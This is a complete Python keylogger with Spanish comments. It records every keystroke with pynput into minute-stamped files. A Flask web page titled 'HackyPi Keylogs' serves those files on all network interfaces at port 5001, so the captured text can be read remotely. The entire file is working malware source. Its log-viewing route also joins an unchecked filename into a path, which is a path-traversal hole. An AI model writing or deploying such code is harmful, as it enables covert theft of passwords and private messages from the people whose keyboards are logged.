from pynput import keyboard
from flask import Flask, render_template_string, send_file
import datetime
import threading
import os

# Carpeta donde se guardan los logs
log_dir = "keylogs"
os.makedirs(log_dir, exist_ok=True)

# Variables globales
current_log_path = ""
last_minute = None
stop_logging = False
pressed_keys = set()

# Crear log con timestamp
def get_log_filename():
    now = datetime.datetime.now()
    return os.path.join(log_dir, f"log_{now.strftime('%Y-%m-%d_%H-%M')}.txt")

def write_to_log(content):
    global current_log_path, last_minute
    now = datetime.datetime.now()
    minute = now.strftime('%Y-%m-%d_%H-%M')

    if last_minute != minute:
        last_minute = minute
        current_log_path = get_log_filename()

    try:
        with open(current_log_path, "a", encoding="utf-8") as f:
            f.write(content)
    except:
        print("An exception occurred")

# Funciones del keylogger
def on_press(key):
    global stop_logging
    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pressed_keys.add("ctrl")
        elif key == keyboard.KeyCode.from_char('x'):
            pressed_keys.add("x")

        if "ctrl" in pressed_keys and "x" in pressed_keys:
            stop_logging = True
            return False

        if hasattr(key, 'char') and key.char is not None:
            write_to_log(key.char)
        else:
            write_to_log(f"[{key.name}]")
    except Exception as e:
        write_to_log(f"[ERROR:{e}]")

def on_release(key):
    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pressed_keys.discard("ctrl")
        elif key == keyboard.KeyCode.from_char('x'):
            pressed_keys.discard("x")
    except:
        pass

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Iniciar el keylogger en un hilo
logger_thread = threading.Thread(target=start_keylogger)
logger_thread.start()

# Servidor web con Flask
app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Logs</title>
    <style>
        body { font-family: monospace; background: #121212; color: #00ff90; padding: 20px; }
        a { color: #00d0ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        pre { background: #1e1e1e; padding: 10px; border-radius: 6px; }
    </style>
</head>
<body>
    <h1>HackyPi Keylogs</h1>
    <ul>
    {% for log in logs %}
        <li><a href="/view/{{ log }}">{{ log }}</a></li>
    {% endfor %}
    </ul>
</body>
</html>
"""

@app.route("/")
def index():
    logs = sorted(os.listdir(log_dir))
    return render_template_string(HTML_TEMPLATE, logs=logs)

@app.route("/view/<filename>")
def view_log(filename):
    path = os.path.join(log_dir, filename)
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            content = f.read()
        return f"<pre>{content}</pre>"
    return "Archivo no encontrado", 404

# Ejecutar servidor Flask
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5001)
